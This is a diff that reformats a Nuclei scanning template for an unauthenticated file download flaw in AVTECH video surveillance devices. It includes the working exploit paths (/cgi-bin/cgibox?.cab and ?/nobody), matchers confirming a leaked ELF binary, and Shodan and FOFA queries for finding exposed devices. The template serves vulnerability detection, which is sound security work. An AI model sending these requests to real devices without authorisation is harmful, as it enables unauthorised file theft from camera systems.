@@ -1,38 +1,41 @@
-http:
-- matchers:
-  - condition: and
-    part: body
-    type: word
-    words:
-    - ELF
-    - ddns_avtech_final
-  - part: header
-    type: word
-    words:
-    - text/plain
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/cgi-bin/cgibox?.cab'
-  - '{{BaseURL}}/cgi-bin/cgibox?/nobody'
-  stop-at-first-match: true
 id: avtech-unauth-file-download
-info:
-  author: ritikchaddha
-  description: 'AVTECH video surveillance products unauthenticated file download from
-    web root through /cgi-bin/cgibox, Since the .cab string is verified by the strstr
-    method, the file download can be realized by adding ?.cab at the end of the file
-    name.
 
-    '
-  metadata:
-    fofa-query: "app=\"AVTECH-\u89C6\u9891\u76D1\u63A7\""
-    max-req: 2
-    shodan-query: title:"login" product:"Avtech"
-    verified: 'true'
+info:
   name: AVTECH Video Surveillance Product - Unauthenticated File Download
+  author: ritikchaddha
   severity: high
-  tags: exposure,avtech,unauth,download,iot
+  description: |
+    AVTECH video surveillance products unauthenticated file download from web root through /cgi-bin/cgibox, Since the .cab string is verified by the strstr method, the file download can be realized by adding ?.cab at the end of the file name.
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: title:"login" product:"Avtech"
+    fofa-query: app="AVTECH-视频监控"
+  tags: exposure,avtech,unauth,download,iot,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/cgibox?.cab"
+      - "{{BaseURL}}/cgi-bin/cgibox?/nobody"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ELF'
+          - 'ddns_avtech_final'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/plain
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450220672d659c96f3134ac75bc53557b95c01faa67cefd84634fb188c354f566778f5022100f9cbd58ce4e9115544423428538a46ee548ad0c60456f25eb301c898ce71cda4:922c64590222798bb761d5b6d8e72950
